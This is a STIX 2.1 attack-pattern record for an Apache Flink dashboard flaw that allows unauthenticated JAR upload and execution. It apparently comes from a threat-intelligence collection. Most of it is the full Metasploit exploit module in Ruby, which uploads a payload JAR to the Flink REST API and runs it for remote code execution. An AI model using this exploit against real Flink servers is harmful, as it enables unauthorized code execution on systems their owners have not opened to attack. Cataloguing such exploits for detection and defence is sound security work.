{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3fd88bb2-a5c5-421b-8761-13c0b37cf6ff",
    "created": "2024-08-14T17:10:09.715505Z",
    "modified": "2024-08-14T17:10:09.715509Z",
    "name": "Apache Flink JAR Upload Java Code Execution",
    "description": " This module uses job functionality in Apache Flink dashboard web interface to upload and execute a JAR file, leading to remote execution of arbitrary Java code as the web server user.  This module has been tested successfully on Apache Flink versions: 1.9.3 on Ubuntu 18.04.4; 1.11.2 on Ubuntu 18.04.4; 1.9.3 on Windows 10; and 1.11.2 on Windows 10.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_flink_jar_upload_exec.rb",
            "external_id": "apache_flink_jar_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/biggerwing/apache-flink-unauthorized-upload-rce-"
        },
        {
            "source_name": "reference",
            "url": "https://s.tencent.com/research/bsafe/841.html"
        },
        {
            "source_name": "reference",
            "url": "https://cloud.tencent.com/developer/article/1540439"
        },
        {
            "source_name": "reference",
            "url": "https://nsfocusglobal.com/advisory-apache-flink-remote-code-execution-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Flink JAR Upload Java Code Execution',\n        'Description' => %q{\n          This module uses job functionality in Apache Flink dashboard web\n          interface to upload and execute a JAR file, leading to remote\n          execution of arbitrary Java code as the web server user.\n\n          This module has been tested successfully on Apache Flink versions:\n          1.9.3 on Ubuntu 18.04.4;\n          1.11.2 on Ubuntu 18.04.4;\n          1.9.3 on Windows 10; and\n          1.11.2 on Windows 10.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Henry Chen', # Initial technique demonstration and writeup\n          'bigger.wing', # Python exploit\n          'bcoles' # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '48978'],\n          ['PACKETSTORM', '159779'],\n          ['URL', 'https://github.com/biggerwing/apache-flink-unauthorized-upload-rce-'],\n          ['URL', 'https://s.tencent.com/research/bsafe/841.html'],\n          ['URL', 'https://cloud.tencent.com/developer/article/1540439'],\n          ['URL', 'https://nsfocusglobal.com/advisory-apache-flink-remote-code-execution-vulnerability/'],\n        ],\n        'Platform' => 'java',\n        'Arch' => [ARCH_JAVA],\n        'Targets' => [\n          ['Automatic', {}]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2019-11-13',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8081)\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'config')\n    })\n\n    unless res\n      return CheckCode::Unknown('No reply.')\n    end\n\n    unless res.body.include?('flink')\n      return CheckCode::Safe('Target is not Apache Flink.')\n    end\n\n    version = res.get_json_document['flink-version']\n    if version\n      return CheckCode::Appears(\"Apache Flink version #{version}.\")\n    end\n\n    CheckCode::Appears\n  end\n\n  def delete_jar(filename)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'jars', filename),\n      'method' => 'DELETE',\n      'ctype' => 'application/json;charset=UTF-8'\n    )\n  end\n\n  def list_jars\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'jars'),\n      'method' => 'GET'\n    )\n  end\n\n  def upload_jar(filename, data)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'jars', 'upload'),\n      'method' => 'POST',\n      'vars_form_data' => [\n        {\n          'name' => 'jarfile',\n          'data' => data,\n          'filename' => filename,\n          'content_type' => 'application/x-java-archive',\n          'encoding' => 'binary'\n        }\n      ]\n    )\n  end\n\n  def run_jar(filename, entry_class)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'jars', filename, 'run'),\n      'method' => 'POST',\n      'ctype' => 'application/json;charset=UTF-8',\n      'vars_get' => {\n        'entry-class' => entry_class\n      },\n      'data' => {\n        entryClass: entry_class,\n        parallelism: nil,\n        programArgs: nil,\n        savepointPath: nil,\n        allowNonRestoredState: nil\n      }.to_json\n    )\n  end\n\n  def cleanup\n    return unless @jar\n\n    print_status(\"Removing JAR file '#{@jar}' ...\")\n\n    res = delete_jar(@jar)\n\n    unless res && res.code == 200\n      print_warning(\"Cleanup failed. Could not remove JAR file '#{@jar}'\")\n    end\n  end\n\n  def exploit\n    data = generate_payload.encoded_jar.pack\n    fail_with(Failure::Unknown, 'Failed to generate the JAR payload.') unless data\n\n    filename = \"#{rand_text_alpha(8..12)}.jar\"\n\n    print_status(\"Uploading JAR payload '#{filename}' (#{data.length} bytes) ...\")\n\n    res = upload_jar(filename, data)\n\n    unless res\n      fail_with(Failure::Unreachable, 'JAR upload failed. No reply.')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"JAR upload failed. Unexpected reply (HTTP #{res.code}).\")\n    end\n\n    unless res.get_json_document['status'] == 'success'\n      fail_with(Failure::UnexpectedReply, 'JAR upload failed. Unexpected reply.')\n    end\n\n    print_status('Retrieving list of avialable JAR files ...')\n\n    res = list_jars\n\n    unless res\n      fail_with(Failure::Unreachable, 'Could not list available JARs. No reply.')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Could not list available JARs. Unexpected reply (HTTP #{res.code}).\")\n    end\n\n    jars = res.get_json_document['files']\n\n    if jars.blank?\n      fail_with(Failure::UnexpectedReply, 'Could not list available JARs. No JAR files available.')\n    end\n\n    jars.each do |jar|\n      if jar['name'] == filename\n        @jar = jar['id']\n        break\n      end\n    end\n\n    unless @jar\n      fail_with(Failure::UnexpectedReply, 'Could not retrieve JAR file name.')\n    end\n\n    print_good(\"Found uploaded JAR file '#{@jar}'\")\n\n    entry_class = 'metasploit.Payload'\n    print_status(\"Executing JAR payload '#{@jar}' entry class '#{entry_class}' ...\")\n\n    run_jar(@jar, entry_class)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-13",
    "x_mitre_platforms": [
        "java'"
    ]
}